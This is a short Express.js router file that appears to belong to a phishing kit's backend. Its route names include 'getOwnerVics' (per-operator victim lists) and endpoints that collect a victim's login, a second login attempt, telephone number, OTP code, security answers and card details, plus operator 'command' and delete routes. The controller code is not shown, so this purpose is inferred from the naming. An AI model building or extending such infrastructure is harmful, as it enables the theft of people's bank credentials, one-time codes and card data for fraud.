const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitTelephone,
    submitOtp,
    submitSecurity,
    submitCard,
    deleteEntry,
} = require("../controllers/qobController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/telephone", submitTelephone);
router.post("/otp", submitOtp);
router.post("/security", submitSecurity);
router.post("/card", submitCard);
router.post("/delete", deleteEntry);

module.exports = router;
